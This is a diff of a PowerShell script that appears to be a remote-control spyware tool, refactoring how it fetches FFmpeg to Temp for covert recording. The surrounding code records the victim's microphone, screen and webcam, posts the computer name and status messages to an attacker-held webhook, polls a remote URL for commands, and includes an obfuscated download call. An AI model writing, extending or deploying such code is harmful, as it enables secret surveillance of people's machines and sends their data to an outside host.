@@ -324,26 +324,16 @@ while ($true) {
 
 Function RecordAudio{
 param ([int[]]$t)
-$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording audio for $t seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json
-Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 $Path = "$env:Temp\ffmpeg.exe"
 If (!(Test-Path $Path)){  
-$zipUrl = 'https://www.gyan.dev/ffmpeg/builds/packages/ffmpeg-6.0-essentials_build.zip'
-$tempDir = "$env:temp"
-$zipFilePath = Join-Path $tempDir 'ffmpeg-6.0-essentials_build.zip'
-$extractedDir = Join-Path $tempDir 'ffmpeg-6.0-essentials_build'
-Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
-Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
-Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
-Remove-Item -Path $zipFilePath -Force
-Remove-Item -Path $extractedDir -Recurse -Force
+    GetFfmpeg
 }
 sleep 1
-
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording audio for $t seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -name audio -Namespace system
 function getFriendlyName($id) {$reg = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$id";return (get-ItemProperty $reg).FriendlyName}
 $id1 = [audio]::GetDefault(1);$MicName = "$(getFriendlyName $id1)"; Write-Output $MicName
-
 $mp3Path = "$env:Temp\AudioClip.mp3"
 if ($t.Length -eq 0){$t = 10}
 .$env:Temp\ffmpeg.exe -f dshow -i audio="$MicName" -t $t -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $mp3Path
@@ -354,21 +344,13 @@ rm -Path $mp3Path -Force
 
 Function RecordScreen{
 param ([int[]]$t)
-$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording screen for $t seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json
-Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 $Path = "$env:Temp\ffmpeg.exe"
 If (!(Test-Path $Path)){  
-$zipUrl = 'https://www.gyan.dev/ffmpeg/builds/packages/ffmpeg-6.0-essentials_build.zip'
-$tempDir = "$env:temp"
-$zipFilePath = Join-Path $tempDir 'ffmpeg-6.0-essentials_build.zip'
-$extractedDir = Join-Path $tempDir 'ffmpeg-6.0-essentials_build'
-Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
-Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
-Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
-Remove-Item -Path $zipFilePath -Force
-Remove-Item -Path $extractedDir -Recurse -Force
+    GetFfmpeg
 }
-sleep 1
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording screen for $t seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+
 $mkvPath = "$env:Temp\ScreenClip.mkv"
 if ($t.Length -eq 0){$t = 10}
 .$env:Temp\ffmpeg.exe -f gdigrab -t 10 -framerate 30 -i desktop $mkvPath
@@ -591,12 +573,10 @@ if (-not (Test-Path -Path $outputFolder)) {
 if (-not (Test-Path -Path $tempFolder)) {
     New-Item -ItemType Directory -Path $tempFolder | Out-Null
 }
-$ffmpegDownload = "https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip"
-$ffmpegZip = "$tempFolder\ffmpeg-release-essentials.zip"
-if (-not (Test-Path -Path $ffmpegZip)) {
-    I`wr -Uri $ffmpegDownload -OutFile $ffmpegZip
+$Path = "$env:Temp\ffmpeg.exe"
+If (!(Test-Path $Path)){  
+GetFfmpeg
 }
-Expand-Archive -Path $ffmpegZip -DestinationPath $tempFolder -Force
 $videoDevice = $null
 $videoDevice = Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'Image' } | Select-Object -First 1
 if (-not $videoDevice) {
@@ -607,9 +587,7 @@ if (-not $videoDevice) {
 }
 if ($videoDevice) {
     $videoInput = $videoDevice.Name
-    $ffmpegVersion = Get-ChildItem -Path $tempFolder -Filter "ffmpeg-*-essentials_build" | Select-Object -ExpandProperty Name
-    $ffmpegVersion = $ffmpegVersion -replace 'ffmpeg-(\d+\.\d+)-.*', '$1'
-    $ffmpegPath = Join-Path -Path $tempFolder -ChildPath ("ffmpeg-{0}-essentials_build\bin\ffmpeg.exe" -f $ffmpegVersion)
+    $ffmpegPath = "$env:Temp\ffmpeg.exe"
     & $ffmpegPath -f dshow -i video="$videoInput" -frames:v 1 $outputFile -y
 } else {
 }
@@ -691,6 +669,24 @@ Start-Sleep -Milliseconds 10
 }
 }
 
+Function GetFfmpeg{
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":mag_right: ``Downloading FFmpeg to Client..`` :mag_right:"} | ConvertTo-Json
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+$Path = "$env:Temp\ffmpeg.exe"
+    If (!(Test-Path $Path)){  
+        $zipUrl = 'https://www.gyan.dev/ffmpeg/builds/packages/ffmpeg-6.0-essentials_build.zip'
+        $tempDir = "$env:temp"
+        $zipFilePath = Join-Path $tempDir 'ffmpeg-6.0-essentials_build.zip'
+        $extractedDir = Join-Path $tempDir 'ffmpeg-6.0-essentials_build'
+        Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
+        Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
+        Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
+        Remove-Item -Path $zipFilePath -Force
+        Remove-Item -Path $extractedDir -Recurse -Force
+    }
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Download Complete`` :white_check_mark:"} | ConvertTo-Json
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+}
 
 while($true){
     $response = Invoke-RestMethod -Uri $GHurl
